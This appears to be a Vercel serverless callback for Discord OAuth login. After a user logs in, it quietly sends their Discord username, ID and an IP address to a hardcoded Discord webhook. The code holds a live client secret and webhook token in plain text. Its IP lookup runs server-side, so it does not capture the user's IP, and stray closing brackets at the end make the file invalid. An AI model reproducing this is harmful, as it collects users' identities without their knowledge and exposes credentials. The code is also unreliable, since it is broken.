export default async function handler(req, res) {
    const code = req.query.code;

      // Exchange the code for an access token
        const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
              method: "POST",
                  headers: { "Content-Type": "application/x-www-form-urlencoded" },
                      body: new URLSearchParams({
                              client_id: "1388702262829781093",
                                    client_secret: "bTmoIBbUQUTDbL3yhlSP939rEmfZu1L7", // Replace this with your real secret
                                          grant_type: "authorization_code",
                                                code,
                                                      redirect_uri: "https://scrpsites.vercel.app/api/callback",
                                                            scope: "identify",
                      }),
        });

          const tokenData = await tokenRes.json();

            if (!tokenData.access_token) {
                  return res.status(400).send("Failed to get access token.");
            }

              // Get user info
                const userRes = await fetch("https://discord.com/api/users/@me", {
                      headers: {
                              Authorization: `Bearer ${tokenData.access_token}`,
                      },
                });

                  const user = await userRes.json();

                    // Get IP address
                      const ipRes = await fetch("https://api.ipify.org?format=json");
                        const ipData = await ipRes.json();

                          // Send to Discord webhook
                            await fetch("https://discord.com/api/webhooks/1388707471228670062/k5Nwg7siYplB7EBFxk6AMH1qS08d6LoxAP4PMnaUuBZSw02G9iTht9F7eWJQmMfcUdNx", {
                                  method: "POST",
                                      headers: { "Content-Type": "application/json" },
                                          body: JSON.stringify({
                                                  content: `üîê New Discord Login\nüë§ ${user.username}#${user.discriminator}\nüÜî ${user.id}\nüåê IP: ${ipData.ip}`,
                                          }),
                            });

                              // Redirect back to home
                                res.redirect("/?success=true");
}
                                          })
                            })
                      }
                })
            }
                      })
        })
}
